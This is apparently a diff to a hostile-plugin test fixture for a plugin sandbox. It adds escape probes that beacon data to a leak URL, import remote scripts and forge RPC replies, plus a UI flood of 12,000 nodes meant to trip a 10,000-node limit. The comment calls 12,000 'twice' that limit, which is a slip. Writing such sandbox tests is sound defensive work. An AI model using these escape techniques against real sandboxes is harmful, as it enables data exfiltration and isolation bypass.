@@ -133,12 +133,12 @@ const ESCAPES: Record<string, (runtime: HostileRuntime) => Promise<string> | str
     ),
 
   escapeSendBeacon: () =>
-    settleSync(() => {
-      (
-        navigator as unknown as { sendBeacon?: (url: string, data: string) => boolean }
-      ).sendBeacon?.(LEAK_URL, "hostile");
-      throw refusalError("TypeError", "WorkerNavigator has no sendBeacon");
-    }),
+    settleSync(() =>
+      (navigator as unknown as { sendBeacon: (url: string, data: string) => boolean }).sendBeacon(
+        LEAK_URL,
+        "hostile"
+      )
+    ),
 
   escapeImportScripts: () => settleSync(() => importScripts(LEAK_URL)),
 
@@ -213,8 +213,9 @@ const ESCAPES: Record<string, (runtime: HostileRuntime) => Promise<string> | str
       JSON.stringify({ kind: "reply", id: 900003, ok: true, result: { spoofed: true } })
     );
     await sleep(50);
-    await runtime.client.storage.keys();
-    return "ignored";
+    // A real call still settles with its own result, not the forged one.
+    const keys = await runtime.client.storage.keys();
+    return Array.isArray(keys) ? "ignored" : "escaped";
   },
 
   escapeWrite: async (runtime) => {
@@ -285,6 +286,24 @@ function Violation() {
     <ui.View direction="column" gap="md">
       <ui.Heading>Hostile UI violation</ui.Heading>
       <ui.Status tone={"bogus" as never}>This tone is outside the schema.</ui.Status>
+    </ui.View>
+  );
+}
+
+/**
+ * One mount far past the Remote UI budget: `PLUGIN_UI_LIMITS.maxNodes` is
+ * 10,000, and this tree is twice that, so the validator refuses it however React
+ * splits its commits and the host stops the Plugin with `remote-ui-limit`.
+ */
+const FLOOD_NODES = 12_000;
+
+function Flood() {
+  return (
+    <ui.View direction="column" gap="sm">
+      <ui.Heading>Hostile UI flood</ui.Heading>
+      {Array.from({ length: FLOOD_NODES }, (_, index) => (
+        <ui.Text key={index}>{`Node ${index}`}</ui.Text>
+      ))}
     </ui.View>
   );
 }
@@ -368,7 +387,7 @@ if (
     if (!port) return;
     const runtime = createRuntime(port);
     servePluginUi(runtime.client, {
-      pages: { panel: Panel, violation: Violation as ComponentType },
+      pages: { panel: Panel, violation: Violation as ComponentType, flood: Flood as ComponentType },
       onHostRequest: (method, params) => {
         if (method === "health.check") return "pong";
         if (method === PLUGIN_COMMAND_RUN_REQUEST) return runCommand(runtime, params);
